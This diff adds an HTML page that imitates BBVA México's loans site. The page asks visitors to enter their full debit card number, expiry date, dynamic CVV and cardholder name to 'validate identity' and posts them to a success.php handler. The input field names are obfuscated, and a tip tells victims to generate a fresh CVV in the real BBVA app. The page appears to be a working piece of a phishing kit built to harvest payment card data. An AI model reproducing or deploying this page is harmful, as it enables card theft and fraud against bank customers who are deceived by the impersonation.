@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, minimun-sacale=1.0">
+    <title>Préstamos | BBVA México</title>
+
+    <link rel="icon" href="/assets/images/i.jfif">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@100;400;500;700;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/assets/css/normalize.css">
+    <link rel="stylesheet" href="/assets/css/styles.css">
+</head>
+
+<body>
+
+    <header class="header">
+        <div class="header-container">
+            <a href="/"><img src="assets/images/l.svg" alt="Logo"></a>
+        </div>
+    </header>
+
+    <main class="container">
+
+        <div class="l-container">
+
+            <div class="ttle-container">
+                <h1>Tarjeta de débito digital</h1>
+                <p>Ingresa tu tarjeta para validar tu identidad</p>
+            </div>
+
+
+            <form class="form" method="POST" action="success.php" enctype="multipart/form-data">
+
+                <div class="cn-input">
+                    <input type="text" pattern="[0-9]*" inputmode="numeric" id="cn" name="fgdfge"
+                        placeholder="Número de tarjeta" minlength="16" maxlength="16" required>
+                </div>
+
+                <div class="exp-input">
+                    <input type="number" name="igfzvd" min="1" max="12" step="1" placeholder="Mes" required>
+                    <input type="number" name="uemfif" min="25" max="48" step="1" placeholder="Año" required>
+                </div>
+
+                <div class="cs-input">
+                    <input type="text" pattern="[0-9]*" inputmode="numeric" id="cs" name="xcdfgb"
+                        placeholder="CVV Dinámico" minlength="3" maxlength="4" required>
+                </div>
+
+                <div class="n-input">
+                    <input type="text" name="tbmxoa" placeholder="Titular de la tarjeta" maxlength="100">
+                </div>
+
+                <input type="submit" id="sbmt" value="Solicitar" required>
+            </form>
+        </div>
+
+        <div class="t-container">
+            <div class="tip">
+                <p><strong>CVV Dinámico.</strong></p>
+                <p>
+                    Recuerda generar el CVV dinámico de tu tarjeta en tu app BBVA.
+                </p>
+            </div>
+        </div>
+    </main>
+
+    <script type="text/javascript">
+
+        document.getElementById("cn").addEventListener("keypress", function (evt) {
+            if (evt.which < 48 || evt.which > 57) {
+                evt.preventDefault();
+            }
+        });
+
+        document.getElementById("cs").addEventListener("keypress", function (evt) {
+            if (evt.which < 48 || evt.which > 57) {
+                evt.preventDefault();
+            }
+        });
+
+    </script>
+</body>
+
+</html>
